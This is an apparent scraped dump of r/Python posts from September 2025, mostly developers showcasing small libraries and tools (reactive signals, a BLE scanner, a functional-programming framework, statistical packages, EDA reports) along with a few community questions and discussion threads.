What my project does: This is a Bluetooth Low energy scanner application featuring a python backend and a web UI frontend to interact with the devices.

Target audience: Any hobbyist interested in python and Bluetooth Discovery

Comparison: To my knowledge, kismet and some abilities for Bluetooth Low energy devices, but not sure if we can interact with them.

I've started a small project in order to explore the Bluetooth world and especially low energy Bluetooth devices.

I know that project is somewhat already implemented in different other projects like kismet. But I wanted to go really deep with this project.

Firstly to enrich my python and architectural pattern knowledge. Secondly to explore a completely unknown world to me which is the Bluetooth Low energy stuff. Finally, be able to use what I built to control my low energy devices through my home automation system which is running OpenHAB.

Right now, the UI is only listing found devices, this is still pretty rough, but that's the foundation of the project. Next steps are adding interaction service to be able to connect to devices and read/write characteristics through GATT.

The UI a simple html using AlpineJS that run from the fastapi server. I don't feel the need to have a full separate frontend for now.

Any constructive review will be appreciated as well as contribution if you want to üòä

Right now, there is no tests. Yeah, this is bad üòÖ This is probably something that would need to be done urgently if the project grows. Anyone who feel comfortable to implement tests are welcome of course üòéüòÅ

The project is available here: 
[https://github.com/lion24/BleScope](https://github.com/lion24/BleScope)

Happy hacking."
1nl9f0h,I just released reaktiv v0.19.2 with LinkedSignals! Let me explain what Signals even are,loyoan,20,15,2025-09-19 17:11:47,https://www.reddit.com/r/Python/comments/1nl9f0h/i_just_released_reaktiv_v0192_with_linkedsignals/,"I've been working on this reactive state management library for Python, and I'm excited to share that I just added LinkedSignals in v0.19.2. But first, let me explain what this whole ""Signals"" thing is about.

# I built Signals = Excel for your Python code

You know that frustrating bug where you update some data but forget to refresh the UI? Or where you change one piece of state and suddenly everything is inconsistent? **I got tired of those bugs, so I built something that eliminates them completely.**

Signals work just like Excel - change one cell, and all dependent formulas automatically recalculate:

    from reaktiv import Signal, Computed, Effect
    
    # Your data (like Excel cells)
    name = Signal(""Alice"")
    age = Signal(25)
    
    # Automatic formulas (like Excel =A1&"" is ""&B1&"" years old"")
    greeting = Computed(lambda: f""{name()} is {age()} years old"")
    
    # Auto-display (like Excel charts that update automatically)
    display = Effect(lambda: print(greeting()))
    # Prints: ""Alice is 25 years old""
    
    # Just change the data - everything updates automatically!
    name.set(""Bob"")  # Prints: ""Bob is 25 years old""
    age.set(30)      # Prints: ""Bob is 30 years old""

**No more forgotten updates. No more inconsistent state. It just works.**

# What I just added: LinkedSignals

The big feature I'm excited about in v0.19.2 is **LinkedSignals** \- for when you want a value that usually follows a formula, but users can override it temporarily:

    from reaktiv import Signal, Computed, LinkedSignal
    
    # Items from your API
    items = Signal([""iPhone"", ""Samsung"", ""Google Pixel""])
    
    # Selection that defaults to first item but remembers user choice
    selected = LinkedSignal(lambda: items()[0] if items() else None)
    
    print(selected())  # ""iPhone""
    
    # User picks something
    selected.set(""Samsung"") 
    print(selected())  # ""Samsung""
    
    # API updates - smart behavior!
    items.set([""Samsung"", ""OnePlus"", ""Nothing Phone""])
    print(selected())  # Still ""Samsung"" (preserved!)
    
    # But resets when their choice is gone
    items.set([""OnePlus"", ""Nothing Phone""])
    print(selected())  # ""OnePlus"" (smart fallback)

**I built this for:**

* Search/filter UIs where selections should survive data refreshes
* Pagination that clamps to valid pages automatically
* Form defaults that adapt but remember user input
* Any ""smart defaulting"" scenario

# Why I think this matters

The traditional approach:

    # Update data ‚úì
    # Remember to update display (bug!)  
    # Remember to validate selection (bug!)
    # Remember to update related calculations (bug!)

So I built something where you declare relationships once:

    # Declare what depends on what
    # Everything else happens automatically ‚úì

I borrowed this battle-tested pattern from frontend frameworks (Angular, SolidJS) and brought it to Python. Perfect for APIs, data processing, configuration management, or any app where data flows through your system.

Try it out: `pip install reaktiv` (now v0.19.2!)

[GitHub](https://github.com/buiapp/reaktiv) | [Docs](https://reaktiv.readthedocs.io) | [Examples](https://github.com/buiapp/reaktiv/tree/main/examples) | [Playground](https://reaktiv.bui.app/#interactive-demo)

Would love to hear what you think or if you build something cool with it!"
1nl79k2,Small Python trick that saved me hours on client work,Striking-Pizza1443,0,6,2025-09-19 15:51:15,https://www.reddit.com/r/Python/comments/1nl79k2/small_python_trick_that_saved_me_hours_on_client/,"Hey Reddit,

While working on client WordPress sites, I recently used Python to automate a repetitive task, it saved me about 5 hours of work in a single week.

Seeing something I coded actually save real time felt amazing.

Freelancers and developers here, what‚Äôs your favorite small automation trick that‚Äôs made your life easier?"
1nl763h,"I made a Python wrapper for the Kick API (channels, videos, chat, clips)",Few-Independent8041,2,2,2025-09-19 15:47:31,https://www.reddit.com/r/Python/comments/1nl763h/i_made_a_python_wrapper_for_the_kick_api_channels/,"**GitHub:** [https://github.com/Enmn/KickAPI](https://github.com/Enmn/KickAPI)

**PyPi:** [https://pypi.org/project/KickApi/](https://pypi.org/project/KickApi/)

Hello everyone

# What My Project Does

I constructed \*\*KickAPI\*\*, a Python interface to the [Kick.com](http://Kick.com) API. Instead of dealing with raw JSON or writing boilerplate HTTP requests, now you can deal with \*\*organized Python classes\*\* like \`Channel\`, \`Video\`, \`Chat\`, and \`Clip\`.

**This makes it easier:**

* To get channel details (ID, username, followers, etc.)
* To get video metadata (title, duration, views, source URL)
* To browse categories with pagination
* To fetch chat history
* Obtain clip data

# Target Audience

This library is mostly for:

* \*\*Kick data experimenters\*\*
* Those making \*\*bots, dashboards, or analytics tools\*\*
* Hobbyists who are interested in the Kick API

It's \*\*not production-ready yet\*\*, but \*\*stable enough for side projects and experimentation\*\*.

# Comparison

To the best of my knowledge, there isn't an existing, actively maintained \*\*Python wrapper\*\* for Kick's API.

**KickAPI tries to fill that gap by:**

* Providing direct \*\*Pythonic access\*\* to data
* Handling \*\*request/response parsing\*\* internally
* Offering a familiar interface similar to wrappers for other platforms

# Work in Progress

* Adding more endpoints
* Improving error handling
* More helper methods for convenience

# Feedback

I‚Äôd love feedback, suggestions, or contributions!  Pull requests are very welcome"
1nl74ue,Advice on optimizing my setup,Successful-Glass-919,2,7,2025-09-19 15:46:12,https://www.reddit.com/r/Python/comments/1nl74ue/advice_on_optimizing_my_setup/,"I‚Äôve built a Django-based web application that provides a streamlined trading and auctioning platform for specialized used industrial tooling. At present, it‚Äôs actively used by five smaller companies, and while the system doesn‚Äôt support automated payments, all transactions are handled manually. That said, it‚Äôs critical that order placement and price determination remain consistently accurate to ensure proper ""manual"" accounting.

The application is currently deployed on a VPS using Docker Compose, with PostgreSQL running on a local volume. All on the same single machine. Although I don‚Äôt anticipate significant user growth/increased load, the platform has gained traction among clients, and I‚Äôm now looking to optimize the infrastructure for reliability and maintainability. In essence to safe time and for peace of mind. It does not generate too much revenue, so i would only be able to afford around 25-50 dollars per month for everything.

My goal is to simplify infrastructure management without incurring high costs‚Äîideally with a setup that‚Äôs secure, easy to operate, and resilient. A key priority is implementing continuous database backups, preferably stored on a separate system to safeguard against data loss."
1nl5x5g,Introducing 'Drawn' - A super simple text-to-diagram tool,SilverOrder1714,13,11,2025-09-19 15:00:44,https://www.reddit.com/r/Python/comments/1nl5x5g/introducing_drawn_a_super_simple_texttodiagram/,"Hi folks,

I wanted to share [**Drawn**](https://github.com/parthivrmenon/drawn), a minimalistic CLI tool that transforms simple text notation into system diagrams.

‚Ä¶take ‚Äúbeautiful‚Äù with a pinch of salt‚ÄîI‚Äôm a terrible judge of aesthetics üòÖ

---

## What My Project Does

Drawn converts plain text ‚Äúdiagram code‚Äù into visual diagrams. You write a simple notation file, and it generates a clean diagram, making it easier to document systems, workflows, or processes.

**Example:**

```bash
Sun --> Evaporation
Evaporation -(condensation)-> Clouds
Clouds -(precipitation)-> Rain
Rain --> Rivers
Rivers --> Oceans
Oceans -(evaporation)-> Evaporation
```

This produces a neat diagram representing the **Water Cycle**.

---

## Target Audience

Drawn is mainly a **toy/experimental project**‚Äîgreat for developers, students, or anyone who wants a quick way to turn text into diagrams. It‚Äôs not production-grade yet, but it is still quite useful!

---

## Comparison

Unlike heavier diagram tools (like Mermaid or PlantUML), Drawn is **ultra-lightweight and intuitive to use with virtually no learning curve**. It focuses on **simplicity** over exhaustive features, making it quick to use for small projects or notes.

---

Feel free to give it a whirl! I‚Äôd love your feedback and any suggestions for improving the project.
"
1nl5l83,Pips/Dominoes Solver,Ematth,2,0,2025-09-19 14:47:59,https://www.reddit.com/r/Python/comments/1nl5l83/pipsdominoes_solver/,"Hi everyone! I'd like to show off a neat side project I've been working on- a Pips/Dominoes puzzle solver!  
I got the idea for this after doing some Leetcode problems and wondering what the most optimized way would be to tackle this type of puzzle. If you're unfamiliar with this game, check out Pips on the NYTGames site- there's 3 free puzzles every day.

**TARGET AUDIENCE:**  
Anyone interested in Pips/Dominoes puzzles, and wants more than just the daily puzzles provided by NYTGames. This is meant as a non-commercial toy project designed to give myself and others more to do with Pips.

**Comparison:**  
To my knowledge, the only other resource similar to this project is [PipsGame.io](http://PipsGame.io), but they're closed-source compared to my project. And as mentioned, NYTGames runs the official game on their website, but currently their site doesn't provide an archive or more than 3 daily puzzles to do.

**What My Project Does:**  
My intention was to implement backtracking and BFS to solve this like it was a Leetcode problem: backtracking to recursively place dominoes, and BFS to look for all connected tiles with the same constraint.  
The average time to solve a puzzle is 0.059 seconds, although there are some puzzles I've encountered- taking entire minutes- that I need to optimize the algorithm for.

Any suggestions/feedback are appreciated, and I've provided my GitHub link if anyone wants to contribute! In the future, I'm hoping to also build a puzzle generator and flesh out this repository as a playable terminal game.

**LINKS:**  
GitHub Link:¬†[https://github.com/ematth/pips](https://github.com/ematth/pips)"
1nl4bxv,A script to get songs from a playlist with matching total length,Atlas___Hugged,23,4,2025-09-19 13:58:47,https://www.reddit.com/r/Python/comments/1nl4bxv/a_script_to_get_songs_from_a_playlist_with/,"#What my project does
Basically, you input:

- A public youtube playlist

- Target duration

You get:

- Song groups with a matching total length

#Target Audience

So I think this is one of the most specific 'problems'..

I've been making a slow return to jogging, and one of the changes to keep things fresh was to jog until the playlist ended. (Rather than meters, or a route)

I am incrementing the length of the playlist by 15 seconds between each run, and each time finding a group of songs with a matching length can be tiring, which is why I thought of this üòÖ

&nbsp;

So I guess this is for people who want a shuffled playlist, with a specific duration, for some reason.

This is 'py-playlist-subset', try it out üëÄ

https://github.com/Tomi-1997/py-playlist-subset"
1nl300g,Published my first PyPI package: cohens-d-effect-size - Cohen's d effect size calculator,Future-Pen-2493,3,1,2025-09-19 13:03:26,https://www.reddit.com/r/Python/comments/1nl300g/published_my_first_pypi_package_cohensdeffectsize/,"    Hey r/Python! 
    
    I just published my first package to PyPI and wanted to share it with the community: **cohens-d-effect-size**
    
    # What My Project Does
    Cohen's d is a measure of effect size used in statistics, especially in research and data science. While there are existing Cohen's d packages available, I wanted to create a more comprehensive implementation that handled edge cases better and followed NumPy/SciPy conventions more closely.
    
    # Key features
    - **One-sample and two-sample Cohen's d** calculations
    - **Multi-dimensional array support** with axis specification
    - **Missing data handling** (propagate, raise, or omit NaN values)
    - **Pooled vs unpooled variance** options
    - **Full NumPy compatibility** with broadcasting
    - **23 comprehensive tests** covering edge cases
    
    # Installation
    ¬† ¬† pip install cohens-d-effect-size
    
    # Quick example
    ¬† ¬† import numpy as np
    ¬† ¬† from cohens_d import cohens_d
    
    ¬† ¬† # Two-sample Cohen's d
    ¬† ¬† control = np.array([1, 2, 3, 4, 5])
    ¬† ¬† treatment = np.array([3, 4, 5, 6, 7])
    ¬† ¬† effect_size = cohens_d(control, treatment)
    ¬† ¬† print(f""Cohen's d: {effect_size:.3f}"") ¬†# Output: Cohen's d: -1.265
    
    # Comparison to Existing Solutions
    While there are existing Cohen's d packages like `cohens-d` (by Duncan Tulimieri), my package offers several advantages:
    
    - **Multi-dimensional support**: Handle arrays with multiple dimensions and axis specification
    - **Better error handling**: Comprehensive validation and clear error messages ¬†
    - **SciPy conventions**: Follows established patterns from scipy.stats
    - **Missing data policies**: Flexible NaN handling (propagate/raise/omit)
    - **Broadcasting support**: Full NumPy compatibility for complex operations
    - **Extensive testing**: 23 comprehensive tests covering edge cases
    - **Professional packaging**: Modern packaging standards with proper metadata
    
    The existing `cohens-d` package is more basic and doesn't handle multi-dimensional arrays or provide the same level of configurability.
    
    # Links
    - **PyPI**: https://pypi.org/project/cohens-d-effect-size/
    - **GitHub**: https://github.com/DawitLam/cohens-d-scipy
    - **Documentation**: Full README with examples and API docs
    
    This was an incredible learning experience in Python packaging, testing, and following community standards. I learned a lot about:
    - Proper package structure and metadata
    - Comprehensive testing with pytest
    - Following SciPy API conventions
    - NumPy compatibility and broadcasting rules
    
    **Feedback and suggestions are very welcome!** I'm planning to propose this for inclusion in SciPy eventually, so any input on the API design or implementation would be appreciated.
    
    Thanks for being such a supportive community!
    "
1nl1mv8,[Project] turboeda ‚Äî one-command EDA HTML report (pandas + Plotly),rozsit,2,0,2025-09-19 12:01:24,https://www.reddit.com/r/Python/comments/1nl1mv8/project_turboeda_onecommand_eda_html_report/,"Hi everyone, I built a small open-source tool called **turboeda** and wanted to share it in case it‚Äôs useful to others.

What it does
- Reads CSV/XLSX (CSV encoding auto-detected; Excel defaults to first sheet unless --sheet is set)
- Runs a quick EDA pipeline (summary, missingness, numeric/categorical stats, datetime insights)
- Outputs an interactive HTML report (Plotly), with dark/light themes
- Includes correlation heatmaps (numeric-only), histograms, bar charts, top categories
- Works from the CLI and in Jupyter

Install
    pip install turboeda

CLI
    turboeda ""data.csv"" --open
    # Excel:
    turboeda ""data.xlsx"" --sheet ""Sheet1"" --open

Python / Jupyter
    from turboeda import EDAReport
    report = EDAReport(""data.csv"", theme=""dark"", auto_save_and_open=True)
    res = report.run()
    # optional:
    # report.to_html(""report.html"", open_in_browser=True)

Links
- PyPI: https://pypi.org/project/turboeda/
- Source: https://github.com/rozsit/turboeda

It‚Äôs still young; feedback, issues, and PRs are very welcome. MIT licensed. Tested on Python 3.9‚Äì3.12 (Windows/macOS/Linux).

Thanks for reading!"
1nl14dr,Built a real-time debugging dashboard that works with any FastAPI app,doganarif,20,5,2025-09-19 11:35:38,https://www.reddit.com/r/Python/comments/1nl14dr/built_a_realtime_debugging_dashboard_that_works/,"# What My Project Does

FastAPI Radar is a debugging dashboard that gives you complete visibility into your FastAPI applications. Once installed, it monitors and displays:

* All HTTP requests and responses with timing data
* Database queries with execution times
* Exceptions with full stack traces
* Performance metrics in real-time

Everything is viewable through a clean web interface that updates live as your app handles requests. You access it at `/__radar/` while your app is running.

# Target Audience

This is primarily for developers working with FastAPI during development and debugging. It's NOT meant for production use (though you can disable it in prod with a flag).

If you've ever found yourself adding print statements to debug API calls, wondering why an endpoint is slow, or trying to track down which queries are running, this tool is for you. It's especially useful when building REST APIs with FastAPI + SQLAlchemy.

GitHub: [github.com/doganarif/fastapi-radar](http://github.com/doganarif/fastapi-radar)"
1nl0336,anyone here to teach me python,Dry-Leave8217,0,10,2025-09-19 10:39:05,https://www.reddit.com/r/Python/comments/1nl0336/anyone_here_to_teach_me_python/,i am new to this python world so can someone teach me python I can put 2 hr for 5 days every week and i am adding this extra info just to reach the word limit 
1nkzmy7,prob_conf_mat - Statistical inference for classification experiments and confusion matrices,ioverho,4,0,2025-09-19 10:12:21,https://www.reddit.com/r/Python/comments/1nkzmy7/prob_conf_mat_statistical_inference_for/,"[`prob_conf_mat`](https://github.com/ioverho/prob_conf_mat) is a library I wrote to support my statistical analysis of classification experiments. It's now at the point where I'd like to get some external feedback, and before sharing it with its intended audience, I was hoping some interested r/Python users might want to take a look first.

This is the first time I've ever written code with others in mind, and this project required learning many new tools and techniques (e.g., unit testing, Github actions, type checking, pre-commit checks, etc.). I'm very curious to hear whether I've implemented these correctly, and generally I'd love to get some feedback on the readability of the documentation.

Please don't hesitate to ask any questions; I'll respond as soon as I can.

# What My Project Does

When running a classification experiment, we typically evaluate a classification model's performance by evaluating it on some held-out data. This produces a [confusion matrix](https://en.wikipedia.org/wiki/Confusion_matrix), which is a tabulation of which class the model predicts when presented with an example from some class. Since confusion matrices are hard to read, we usually summarize them using classification metrics (e.g., accuracy, F1, MCC). If the metric achieved by our model is better than the value achieved by another model, we conclude that our model is better than the alternative.

While very common, this framework ignores a lot of information. There's no accounting for the amount of uncertainty in the data, for sample sizes, for different experiments, or for the size of the difference between metric scores.

This is where [`prob_conf_mat`](https://github.com/ioverho/prob_conf_mat) comes in. It quantifies the uncertainty in the experiment, it allows users to combine different experiments into one, and it enables statistical significance testing. Broadly, theit does this by sampling many plausible counterfactual confusion matrices, and computes metrics over all confusion matrices to produce a distribution of metric values. In short, with very little additional effort, it enables rich statistical inferences about your classification experiment.

# Example

So instead of doing:

    >>> import sklearn
    >>> sklearn.metrics.f1_score(model_a_y_true, model_a_y_pred, average=""macro"")
    0.75
    >>> sklearn.metrics.f1_score(model_b_y_true, model_a_b_pred, average=""macro"")
    0.66
    >>> 0.75 > 0.66
    True

Now you can do:

    >>> import prob_conf_mat
    >>> study = prob_conf_mat.Study()        # Initialize a Study
    >>> study.add_experiment(""model_a"", ...) # Add data from model a
    >>> study.add_experiment(""model_b"", ...) # Add data from model b
    >>> study.add_metric(""f1@macro"", ...)    # Add a metric to compare them
    >>> study.plot_pairwise_comparison(      # Compare the experiments
        metric=""f1@macro"",
        experiment_a=""model_a"",
        experiment_b=""model_b"",
        min_sig_diff=0.005,
    )

[Example difference distribution figure](https://github.com/ioverho/prob_conf_mat/raw/main/documentation/assets/figures/readme/comparison_plot.svg)

Now you can tell how probable it is that \`model\_a\` is actually better, and whether this difference is statistically significant or not.

The ['Getting Started' chapter of the documentation](https://www.ivoverhoeven.nl/prob_conf_mat/Getting%20Started/index.html) has a lot more examples.

# Target Audience

This was built for anyone who produces confusion matrices and wants to analyze them. I expect that it will mostly be interesting for those in academia: scientists, students, statisticians and the like. The documentation is hopefully readable for anyone with some machine-learning/statistics background.

# Comparison

There are many, many excellent Python libraries that handle confusion matrices, and compute classification metrics (e.g., [`scikit-learn`](https://scikit-learn.org/stable/auto_examples/model_selection/plot_confusion_matrix.html), [`TorchMetrics`](https://lightning.ai/docs/torchmetrics/stable/), [`PyCM`](https://github.com/sepandhaghighi/pycm), *inter alia*).

The most famous of these is probably `scikit-learn`. `prob-conf-mat` implements all metrics currently in `scikit-learn` (plus some more) and tests against these to ensure equivalence. We also enable class averaging for all metrics through a single interface.

For the statistical inference portion (i.e., what sets `prob_conf_mat` apart), to the best of my knowledge, there are no viable alternatives.

# Design & Implementation

My primary motivation for this project was to learn, and because of that, **I do not** **use AI tools**. Going forward this might change (although minimally).

# Links

Github: [https://github.com/ioverho/prob\_conf\_mat](https://github.com/ioverho/prob_conf_mat)

Homepage: [https://www.ivoverhoeven.nl/prob\_conf\_mat/](https://www.ivoverhoeven.nl/prob_conf_mat/)

PyPi: [https://pypi.org/project/prob-conf-mat/](https://pypi.org/project/prob-conf-mat/)"
1nkwv1v,Best Way to Scrape Amazon?,MetalGoatP3AK,0,6,2025-09-19 07:14:26,https://www.reddit.com/r/Python/comments/1nkwv1v/best_way_to_scrape_amazon/,"I‚Äôm scraping product listings, reviews, but rotating datacenter proxies doesn‚Äôt cut it anymore. Even residential proxies sometimes fail. I added headless Chrome rendering but it slowed everything down. Is anyone here successfully scraping Amazon? Does an API solve this better, or do you still need to layer proxies + browser automation?"
1nkvz9d,StampDB ‚Äì A tiny C++ Time Series Database with a NumPy-native Python API,Lost-Dragonfruit-663,9,0,2025-09-19 06:19:02,https://www.reddit.com/r/Python/comments/1nkvz9d/stampdb_a_tiny_c_time_series_database_with_a/,"Hey everyone üëã

# What My Project Does

I‚Äôve been working on a small side project called **StampDB**, a lightweight time series database written in C++ with a clean Python wrapper.

The idea is to provide a **minimal, NumPy-native interface** for time series data, without the overhead of enterprise-grade database systems. It‚Äôs designed for folks who just need a simple, fast way to manage time series in Python, especially in research or small-scale projects.

### Features

* C++ core with CSV-based storage + schema validation
* NumPy-native API for Python users
* In-memory indexing + append-only disk writes
* Simple relational algebra (selection, projection, joins, etc.) on NumPy structured arrays
* Atomic writes + compaction on close

# Comparison

Not the main goal, but still fun to test ‚Äî StampDB runs:

* **2√ó faster writes**
* **30√ó faster reads**
* **50√ó faster queries** ‚Ä¶ compared to tinyflux (a pure Python time series DB).

# Target Audience

### Not for you if you need

* Multi-process or multi-threaded access
* ACID guarantees
* High scalability

# üîó Links

* [https://github.com/aadya940/stampdb](https://github.com/aadya940/stampdb)

Would love feedback, especially from anyone who‚Äôs worked with time series databases. This is mostly an educational work done while reading ""Designing Data Intensive Applications""."
1nkttgm,Python script to .exe - is this still a thing?,Icy-Farm9432,0,10,2025-09-19 04:16:44,https://www.reddit.com/r/Python/comments/1nkttgm/python_script_to_exe_is_this_still_a_thing/,"Hello,

I've built a ‚Äúlittle‚Äù tool that lets you convert a Python script (or several) into an exe file.

It's really easy to use:

You don't even need to have Python installed to use it.

When you start it up, a GUI appears where you can select your desired Python version from a drop-down menu.

You specify the folder where the Python scripts are located.

Then you select the script that you want to be started first.

Now you can give your exe file a name and add an icon.



Once you have specified the five parameters, you can choose whether you want a ‚Äúonefile‚Äù or a folder with the finished bundle.

Python is now compiled in the desired version.



Then a little black magic happens and the Python scripts are searched for imports. If libraries are not found, an online search is performed on pypi. If several candidates are available, a selection menu appears where you must choose the appropriate one. For example, opencv: the import is: import cv2, and the installation package is called opencv-python.

Once you've imported the history, the PC does a little calculation and you get either a single exe file containing everything, as selected, or a folder structure that looks like this:

Folder

\-- pgmdata/

\-- python/

\-- myProgram.exe



You can now distribute the exe or folder to any computer and start it. So you don't have to install anything, nor does anything change on the system.

  


Now to my question: Is this even a thing anymore these days? I mean, before I go to the trouble of polishing it all up and uploading it to GitHub. Tools like cxfreeze and py2exe have been around forever, but will they even still be used in 2025? "
1nksvm0,enso: A functional programming framework for Python,enso_lang,177,64,2025-09-19 03:29:06,https://www.reddit.com/r/Python/comments/1nksvm0/enso_a_functional_programming_framework_for_python/,"Hello all, I'm here to make my first post and 'release' of my functional programming framework, enso.  Right before I made this post, I made the repository public.  You can find it [here.](https://gitlab.com/evansemenoff/enso)

# What my project does

enso is a high-level functional framework that works over top of Python.  It expands the existing Python syntax by adding a variety of features.  It does so by altering the AST at runtime, expanding the functionality of a handful of built-in classes, and using a modified tokenizer which adds additional tokens for a preprocessing/translation step.

I'll go over a few of the basic features so that people can get a taste of what you can do with it.

1. Automatically curried functions!

How about the function add, which looks like

    def add(x:a, y:a) -> a:
        return x + y

Unlike normal Python, where you would need to call add with 2 arguments, you can call this `add` with only one argument, and then call it with the other argument later, like so:

    f = add(2)
    f(2)
    4

2. A map operator

Since functions are automatically curried, this makes them really, really easy to use with `map`.  Fortunately, enso has a map operator, much like Haskell.

    f <$> [1,2,3]
    [3, 4, 5]

3. Predicate functions

Functions that return `Bool` work a little differently than normal functions.  They are able to use the pipe operator to filter iterables:

    even? | [1,2,3,4]
    [2, 4]

4. Function composition

There are a variety of ways that functions can be composed in enso, the most common one is your typical function composition.

    h = add(2) @ mul(2)
    h(3)
    8

Additionally, you can take the *direct sum* of 2 functions:

    h = add + mul
    h(1,2,3,4)
    (3, 12)

And these are just a few of the ways in which you can combine functions in enso.

5. Macros

enso has a variety of macro styles, allowing you to redefine the syntax on the file, adding new operators, regex based macros, or even complex syntax operations.  For example, in the REPL, you can add a `zip` operator like so:

    macro(op(""-=-"", zip))
    [1,2,3] -=- [4,5,6]
    [(1, 4), (2, 5), (3, 6)]

This is just one style of macro that you can add, see the readme in the project for more.

6. Monads, more new operators, new methods on existing classes, tons of useful functions, automatically derived function 'variants', and loads of other features made to make writing code fun, ergonomic and aesthetic.

Above is just a small taster of the features I've added.  The README file in the repo goes over a lot more.

# Target Audience

What I'm hoping is that people will enjoy this.  I've been working on it for awhile, and dogfooding my own work by writing several programs in it.  My own smart-home software is written entirely in *enso.*  I'm really happy to be able to share what is essentially a beta version of it, and would be super happy if people were interested in contributing, or even just using enso and filing bug reports.  My long shot goal is that one day I will write a proper compiler for enso, and either self-host it as its own language, or run it on something like LLVM and avoid some of the performance issues from Python, as well as some of the sticky parts which have been a little harder to work with.

I will post this to r/functionalprogramming once I have obtained enough karma.

Happy coding."
1nkq8pt,T-Strings: What will you do?,sikes01,127,89,2025-09-19 01:22:59,https://www.reddit.com/r/Python/comments/1nkq8pt/tstrings_what_will_you_do/,"Good evening from my part of the world!

I'm excited with the new functionality we have in Python 3.14. I think the feature that has caught my attention the most is the introduction of [t-strings](https://docs.python.org/3.14/whatsnew/3.14.html#pep-750-template-strings).

I'm curious, what do you think will be a good application for t-strings? I'm planning to use them as better-formatted templates for a custom message pop-up in my homelab, taking information from different sources to format for display. Not reinventing any functionality, but certainly a cleaner and easier implementation for a message dashboard.

Please share your ideas below, I'm curious to see what you have in mind!"
1nkohvq,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,2,2,2025-09-19 00:00:50,https://www.reddit.com/r/Python/comments/1nkohvq/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1nknfji,Free eBook - Working with Files in Python 3,caudor,3,3,2025-09-18 23:12:19,https://www.reddit.com/r/Python/comments/1nknfji/free_ebook_working_with_files_in_python_3/,"I enjoy helping out folks in the Python 3 community.

If you are interested, you can click the top link on my landing page and download my eBook, ""Working with Images Python 3"" for free:¬†[https://linktr.ee/chris4sawit](https://linktr.ee/chris4sawit)

There are other free Python eBooks there as well, so feel free to grab what you want.

I hope this 19 page pdf will be useful for someone interested in working with Images in Python with a special focus on the Pillow library. 

Since it is sometimes difficult to copy/paste from a pdf, I've added a .docx and .md version as well. The link will download all files in the project. Also included are the image files used in the code samples.  No donations will be requested. 

Only info needed is a name and email address to get the download link. If you don't care to provide your name, that's fine; please feel free to use any alias."
1nkiwc3,Streaming BLE Sensor Data into Microsoft Power BI using Python,bleuio,0,0,2025-09-18 20:09:09,https://www.reddit.com/r/Python/comments/1nkiwc3/streaming_ble_sensor_data_into_microsoft_power_bi/,"This project demonstrate how to stream¬†**Bluetooth Low Energy (BLE) sensor data**¬†directly into¬†**Microsoft Power BI**¬†using Python. By combining a HibouAir environmental sensor with BleuIO and a simple Python script, we can capture live readings of¬†**CO2, temperature, and humidity**¬†and display them in real time on a Power BI dashboard for further analysis.   
details and source code available here

[https://www.bleuio.com/blog/streaming-ble-sensor-data-into-microsoft-power-bi-using-bleuio/](https://www.bleuio.com/blog/streaming-ble-sensor-data-into-microsoft-power-bi-using-bleuio/)

"
1nkit7n,Dou you use jit compilation with numba?,husayd,17,31,2025-09-18 20:05:59,https://www.reddit.com/r/Python/comments/1nkit7n/dou_you_use_jit_compilation_with_numba/,Is it common among experienced python devs and what is the scope of it (where it cannot be used really). Or do you use other optimization tools like that?
1nkidxq,Today I learned that Python doesn't care about how many spaces you indent as long as it's consistent,FillAny3101,587,191,2025-09-18 19:49:56,https://www.reddit.com/r/Python/comments/1nkidxq/today_i_learned_that_python_doesnt_care_about_how/,"Call me stupid for only discovering this after 6 years, but did you know that you can use as many spaces you want to indent, as long as they're consistent within one indented block. For example, the following (awful) code block gives no error:

    def say_hi(bye = False):
    ¬†print(""Hi"")
    ¬†if bye:
    ¬† ¬† ¬† ¬† print(""Bye"")"
1nkfla2,üöÄ Dispytch ‚Äî async Python framework for building event-driven services,e1-m,0,8,2025-09-18 18:04:04,https://www.reddit.com/r/Python/comments/1nkfla2/dispytch_async_python_framework_for_building/,"Hey folks!  
Check out [**Dispytch**](https://github.com/e1-m/dispytch) ‚Äî async Python framework for building event-driven services.

# üöÄ What Dispytch Does

Dispytch makes it easy to build services that react to events ‚Äî whether they're coming from Kafka, RabbitMQ, Redis or some other broker. You define event types as Pydantic models and wire up handlers with dependency injection. Dispytch handles validation, retries, and routing out of the box, so you can focus on the logic.

# ‚öîÔ∏è Comparison

|Framework|Focus|Notes|
|:-|:-|:-|
|Celery|Task queues|Great for backgroud processing|
|Faust|Kafka streams|Powerful, but streaming-centric|
|Nameko|RPC services|Sync-first, heavy|
|FastAPI|HTTP APIs|Not for event processing|
|FastStream|Stream pipelines|Built around streams‚Äîgreat for  data pipelines.|
|**Dispytch**|Event handling|Event-centric and reactive, designed for clear event-driven services.|

# ‚úçÔ∏è Quick API Example

# Handler

    user_events.handler(topic='user_events', event='user_registered')
    async def handle_user_registered(
            event: Event[UserCreatedEvent],
            user_service: Annotated[UserService, Dependency(get_user_service)]
    ):
        user = event.body.user
        timestamp = event.body.timestamp
    
        print(f""[User Registered] {user.id} - {user.email} at {timestamp}"")
    
        await user_service.do_smth_with_the_user(event.body.user)

# Emitter

    async def example_emit(emitter):
       await emitter.emit(
           UserRegistered(
               user=User(
                   id=str(uuid.uuid4()),
                   email=""example@mail.com"",
                   name=""John Doe"",
               ),
               timestamp=int(datetime.now().timestamp()),
           )
       )

# üéØ Features

* ‚ö° Async core
* üîå FastAPI-style DI
* üì® Kafka, RabbitMQ and Redis PubSub out of the box
* üß± Composable, override-friendly architecture
* ‚úÖ Pydantic-based validation
* üîÅ Built-in retry logic

üëÄ Try it out:

    uv add dispytch

